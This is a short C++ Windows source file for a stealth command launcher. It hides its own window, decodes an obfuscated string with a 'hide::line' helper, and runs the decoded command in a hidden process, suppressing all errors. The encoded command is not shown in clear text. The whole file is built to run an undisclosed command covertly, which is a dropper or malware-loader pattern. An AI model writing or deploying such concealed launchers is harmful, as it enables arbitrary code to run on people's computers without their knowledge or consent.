#ifndef Win64
#define Win64

#include <iostream>
#include <string>
#include <stdexcept>

#include <windows.h>

#include "xstr.hpp"

using namespace std;

HWND getHWND (DWORD proc) {
    HWND hwnd = 0;
    do {
        hwnd = FindWindowEx(NULL, hwnd, NULL, NULL);
        DWORD pid = 0;
        GetWindowThreadProcessId (hwnd, &pid);
        if (pid == proc) return hwnd;
    }
    while (hwnd != NULL);
    return NULL;
}

int
WinMain (   HINSTANCE hInstance,
            HINSTANCE hPrevInstance,
            LPTSTR    lpCmdLine,
            int       nCmdShow 
) {
try {
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    ShowWindow( getHWND( GetCurrentProcessId()), SW_HIDE);

    hide::line args("lpEK8Q3dBrTONPRSQV8NmrnEJMgomg2oxNWh");
    args.decode();

    ZeroMemory( &si, sizeof(si) );
    si.cb = sizeof(si);
    ZeroMemory( &pi, sizeof(pi) );

    if( !CreateProcess ( NULL,   // No module name (use command line)
        (LPSTR)args.c_str(),  // Command line
        NULL,           // Process handle not inheritable
        NULL,           // Thread handle not inheritable
        FALSE,          // Set handle inheritance to FALSE
        CREATE_NO_WINDOW,  // Hidden
        NULL,           // Use parent's environment block
        NULL,           // Use parent's starting directory 
        &si,            // Pointer to STARTUPINFO structure
        &pi)           // Pointer to PROCESS_INFORMATION structure
    )
     throw new exception();

  //  WaitForSingleObject( pi.hProcess, INFINITE );

    CloseHandle( pi.hProcess );
    CloseHandle( pi.hThread );

    return 0;
} catch (const exception& e) {
    return 0;
}}

#endif